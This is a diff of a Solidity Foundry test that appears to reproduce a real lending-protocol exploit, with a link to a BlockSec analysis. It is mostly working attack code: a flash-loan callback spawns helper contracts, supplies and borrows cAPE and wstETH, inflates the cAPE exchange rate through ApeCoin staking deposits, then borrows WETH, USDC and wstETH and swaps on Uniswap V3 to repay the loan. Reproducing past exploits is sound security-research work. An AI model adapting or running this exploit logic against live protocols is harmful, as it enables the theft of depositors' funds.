@@ -3,6 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1636650252844294144
 // @TX
@@ -56,7 +57,7 @@ contract ContractTest is Test {
         );
 
         // () -> ()
-        _proxy.call(
+        (bool sucess21,) = _proxy.call(
             abi.encodePacked(
                 bytes4(0x42b0b77c),
                 abi.encode(address(this), _wstETH, uint256(47_352_823_905_004_708_422_332), new bytes(0), uint16(0))
@@ -102,16 +103,16 @@ contract ContractTest is Test {
     function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
         public
         payable
-        returns (bool)
+        returns (bool booleans)
     {
         // approve(spender, amount) -> (bool _: true)
-        _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));
+        (bool sucess22,) = _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));
 
         for (uint256 i = 0; i < 8; i++) {
             Slave _slave = new Slave();
             if (i == 6) {
                 // transfer(recipient, amount) -> (bool _: true)
-                _wstETH.call(
+                (bool sucess23,) = _wstETH.call(
                     abi.encodePacked(
                         bytes4(0xa9059cbb), abi.encode(address(_slave), uint256(3_676_225_912_400_376_673_786))
                     )
@@ -119,7 +120,7 @@ contract ContractTest is Test {
                 _slave.remove(1_120_000_000_000_000_000_000_000);
             } else {
                 // transfer(recipient, amount) -> (bool _: true)
-                _wstETH.call(
+                (bool sucess24,) = _wstETH.call(
                     abi.encodePacked(
                         bytes4(0xa9059cbb), abi.encode(address(_slave), uint256(6_039_513_998_943_475_964_078))
                     )
@@ -129,7 +130,7 @@ contract ContractTest is Test {
 
             if (i != 7) {
                 // supply(asset, amount, onBehalfOf, referralCode) -> ()
-                _ParaProxy.call(
+                (bool sucess25,) = _ParaProxy.call(
                     abi.encodePacked(
                         bytes4(0x617ba037),
                         abi.encode(_cAPE, IERC20(_cAPE).balanceOf(address(this)), address(this), uint256(0))
@@ -139,7 +140,8 @@ contract ContractTest is Test {
         }
 
         // approve(spender, amount) -> (bool _: true)
-        _wstETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));
+        (bool sucess26,) =
+            _wstETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));
 
         // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut) 1334451948153998962969
         ExactInputSingleParams memory _var4 = ExactInputSingleParams({
@@ -152,10 +154,11 @@ contract ContractTest is Test {
             amountOutMinimum: 1_300_000_000_000_000_000_000,
             sqrtPriceLimitX96: 0
         });
-        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var4)));
+        (bool sucess27,) = _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var4)));
 
         // approve(spender, amount) -> (bool _: true)
-        _WETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));
+        (bool sucess28,) =
+            _WETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));
 
         // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut) 492214464588784613678468
         ExactInputSingleParams memory _var6 = ExactInputSingleParams({
@@ -168,24 +171,26 @@ contract ContractTest is Test {
             amountOutMinimum: 480_000_000_000_000_000_000_000,
             sqrtPriceLimitX96: 0
         });
-        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var6)));
+        (bool sucess29,) = _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var6)));
 
         // withdraw(amount) -> ()
-        _cAPE.call(abi.encodePacked(bytes4(0x2e1a7d4d), abi.encode(IERC20(_cAPE).balanceOf(address(this)))));
+        (bool sucess30,) =
+            _cAPE.call(abi.encodePacked(bytes4(0x2e1a7d4d), abi.encode(IERC20(_cAPE).balanceOf(address(this)))));
 
         // approve(spender, amount) -> (bool _: true)
-        _APE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Apecoin__Staking, type(uint256).max)));
+        (bool sucess33,) =
+            _APE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Apecoin__Staking, type(uint256).max)));
 
         // depositApeCoin(amount,recipient) -> ()
-        _Apecoin__Staking.call(
+        (bool sucess17,) = _Apecoin__Staking.call(
             abi.encodePacked(bytes4(0xbd5023a9), abi.encode(IERC20(_APE).balanceOf(address(this)), _cAPE))
         );
 
         // approve(spender, amount) -> (bool _: true)
-        _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));
+        (bool success18,) = _cAPE.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_ParaProxy, type(uint256).max)));
 
         // borrow(asset, amount, referralCode, onBehalfOf) -> ()
-        _ParaProxy.call(
+        (bool success19,) = _ParaProxy.call(
             abi.encodePacked(
                 bytes4(0x1d5d7237),
                 abi.encode(_wstETH, uint256(44_952_823_905_004_708_422_332), uint256(0), address(this))
@@ -193,21 +198,22 @@ contract ContractTest is Test {
         );
 
         // borrow(asset, amount, referralCode, onBehalfOf) -> ()
-        _ParaProxy.call(
+        (bool success7,) = _ParaProxy.call(
             abi.encodePacked(
                 bytes4(0x1d5d7237), abi.encode(_USDC, uint256(7_200_000_000_000), uint256(0), address(this))
             )
         );
 
         // borrow(asset, amount, referralCode, onBehalfOf) -> ()
-        _ParaProxy.call(
+        (bool success14,) = _ParaProxy.call(
             abi.encodePacked(
                 bytes4(0x1d5d7237), abi.encode(_WETH, uint256(1_200_000_000_000_000_000_000), uint256(0), address(this))
             )
         );
 
         // approve(spender, amount) -> (bool _: true)
-        _USDC.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));
+        (bool success15,) =
+            _USDC.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_Uniswap_V3__Router, type(uint256).max)));
 
         // exactInputSingle(ExactInputSingleParams calldata params) -> (uint256 amountOut)
         ExactInputSingleParams memory _var9 = ExactInputSingleParams({
@@ -220,10 +226,12 @@ contract ContractTest is Test {
             amountOutMinimum: 4_042_105_262,
             sqrtPriceLimitX96: 0
         });
-        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var9)));
+        (bool success17,) = _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0x414bf389), abi.encode(_var9)));
 
         // approve(spender, amount) -> (bool _: true) --- TOTAL DEBT TO PAY THE LOAN
-        _wstETH.call(abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_proxy, uint256(47_376_500_316_957_210_776_543))));
+        (bool success10,) = _wstETH.call(
+            abi.encodePacked(bytes4(0x095ea7b3), abi.encode(_proxy, uint256(47_376_500_316_957_210_776_543)))
+        );
 
         // exactOutputSingle(ExactOutputSingleParams calldata params) -> (uint256 amountOut)
         ExactOutputSingleParams memory _var11 = ExactOutputSingleParams({
@@ -236,10 +244,11 @@ contract ContractTest is Test {
             amountInMaximum: 2_675_071_643_612_383_606_774,
             sqrtPriceLimitX96: 0
         });
-        _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0xdb3e2198), abi.encode(_var11)));
+        (bool success12,) = _Uniswap_V3__Router.call(abi.encodePacked(bytes4(0xdb3e2198), abi.encode(_var11)));
 
         // true
-        return true;
+        booleans = true;
+        return booleans;
     }
 
     receive() external payable {}
@@ -261,7 +270,7 @@ contract Slave {
 
     function remove(uint256 _amountOfShares) public payable {
         // supply(asset, amount, onBehalfOf, referralCode) -> ()
-        _ParaProxy.call(
+        (bool sucess13,) = _ParaProxy.call(
             abi.encodePacked(
                 bytes4(0x617ba037),
                 abi.encode(_wstETH, IERC20(_wstETH).balanceOf(address(this)), address(this), uint256(0))
@@ -269,12 +278,14 @@ contract Slave {
         );
 
         // borrow(asset, amount, referralCode, onBehalfOf) -> ()
-        _ParaProxy.call(
+        (bool success5,) = _ParaProxy.call(
             abi.encodePacked(bytes4(0x1d5d7237), abi.encode(_cAPE, uint256(_amountOfShares), uint256(0), address(this)))
         );
 
         // transfer(recipient, amount) -> (bool _: true)
-        _cAPE.call(abi.encodePacked(bytes4(0xa9059cbb), abi.encode(msg.sender, IERC20(_cAPE).balanceOf(address(this)))));
+        (bool succes4,) = _cAPE.call(
+            abi.encodePacked(bytes4(0xa9059cbb), abi.encode(msg.sender, IERC20(_cAPE).balanceOf(address(this))))
+        );
     }
 
 }
